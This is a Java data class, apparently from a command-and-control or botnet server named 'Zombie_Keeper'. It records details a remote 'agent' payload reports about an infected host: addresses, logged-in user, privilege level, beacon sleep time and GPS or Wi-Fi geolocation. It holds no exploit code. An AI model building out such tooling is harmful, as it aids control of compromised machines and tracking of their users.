package com.manager.Zombie_Keeper.dtos.agent;

import jakarta.validation.constraints.NotBlank;
import java.time.LocalDateTime;

public class AgentDtos {

    // Identidade
    private String hostname;

    @NotBlank
    private String ipv4;

    private String ipv6;

    private String macAddress;

    // Sistema
    private String os;

    private String architecture; // "x86_64", "arm64"

    private String loggedUser;   // "NT AUTHORITY\\SYSTEM", "root"

    private Boolean isElevated = false;

    // Beacon
    private Integer sleepTime = 0;

    // Localização — enviada pelo payload
    private Double lat;
    private Double lng;
    private String city;
    private String country;
    private String region;
    private String locationSource; // "GPS" | "WIFI" | "IP" | "UNKNOWN"
    private Double accuracyMeters;

    // ── Getters & Setters ─────────────────────────────────────────────────────

    public String getHostname()            { return hostname; }
    public void setHostname(String v)      { this.hostname = v; }

    public String getIpv4()                { return ipv4; }
    public void setIpv4(String v)          { this.ipv4 = v; }

    public String getIpv6()                { return ipv6; }
    public void setIpv6(String v)          { this.ipv6 = v; }

    public String getMacAddress()          { return macAddress; }
    public void setMacAddress(String v)    { this.macAddress = v; }

    public String getOs()                  { return os; }
    public void setOs(String v)            { this.os = v; }

    public String getArchitecture()        { return architecture; }
    public void setArchitecture(String v)  { this.architecture = v; }

    public String getLoggedUser()          { return loggedUser; }
    public void setLoggedUser(String v)    { this.loggedUser = v; }

    public Boolean getIsElevated()         { return isElevated; }
    public void setIsElevated(Boolean v)   { this.isElevated = v; }

    public Integer getSleepTime()          { return sleepTime; }
    public void setSleepTime(Integer v)    { this.sleepTime = v; }

    public Double getLat()                 { return lat; }
    public void setLat(Double v)           { this.lat = v; }

    public Double getLng()                 { return lng; }
    public void setLng(Double v)           { this.lng = v; }

    public String getCity()                { return city; }
    public void setCity(String v)          { this.city = v; }

    public String getCountry()             { return country; }
    public void setCountry(String v)       { this.country = v; }

    public String getRegion()              { return region; }
    public void setRegion(String v)        { this.region = v; }

    public String getLocationSource()      { return locationSource; }
    public void setLocationSource(String v){ this.locationSource = v; }

    public Double getAccuracyMeters()      { return accuracyMeters; }
    public void setAccuracyMeters(Double v){ this.accuracyMeters = v; }
}